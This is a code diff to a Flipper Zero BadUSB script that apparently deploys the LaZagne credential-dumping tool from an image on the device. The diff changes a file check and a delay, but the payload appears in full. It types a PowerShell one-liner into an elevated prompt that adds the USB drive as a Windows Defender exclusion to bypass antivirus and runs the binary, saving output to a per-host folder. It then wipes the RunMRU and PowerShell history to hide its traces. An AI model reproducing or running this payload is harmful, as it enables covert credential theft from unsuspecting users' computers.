@@ -8,15 +8,13 @@ let image = "/ext/apps_data/mass_storage/Lazagne.img";
 let badusb = require("badusb");
 let usbdisk = require("usbdisk");
 let storage = require("storage");
-// Checks for the Powershell.img on the Flipper
-print("Checking for Image...");
-if (storage.exists(image)) {
-    print("Storage Exists.");
-} else {
-    print("Please create the Lazagne.img and place the " + binary + " in that storage...");
-    exit;
+// Checks for the img on the Flipper
+print("Checking for image...");
+if (!storage.fileExists(image)) {
+    print("Missing Mass Storage image!");
+    return;
 }
-// HID as VID/PID and keep connected
+print("Starting HID...");
 badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero" });
 print("Waiting for connection");
 while (!badusb.isConnected()) {
@@ -32,7 +30,7 @@ delay(2000);
 badusb.press("ALT", "y");
 delay(2000);
 print("Running payload"); // Detect the Flipper, set the DriveLetter, set the Flipper's drive as an excluded drive from Windows Defender to bypass AV, Run the given Binary, clean up after and remove command history
-badusb.println("Start-Sleep 2;$DriveLetter = Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter;$drivePath = $DriveLetter + ':';$directoryPath = Join-Path -Path $drivePath -ChildPath $env:COMPUTERNAME-$env:USERNAME;New-Item -ItemType Directory -Path $directoryPath;$Bin_Path = $drivePath + '\\' + '" + binary + "';Add-MpPreference -ExclusionPath $drivePath;cd $directoryPath;. $Bin_Path " + binary_args + ";reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f;Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue;exit");
+badusb.println("Start-Sleep 6;$DriveLetter = Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter;$drivePath = $DriveLetter + ':';$directoryPath = Join-Path -Path $drivePath -ChildPath $env:COMPUTERNAME-$env:USERNAME;New-Item -ItemType Directory -Path $directoryPath;$Bin_Path = $drivePath + '\\' + '" + binary + "';Add-MpPreference -ExclusionPath $drivePath;cd $directoryPath;. $Bin_Path " + binary_args + ";reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f;Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue;exit");
 badusb.press("ENTER");
 badusb.quit();
 delay(2000);
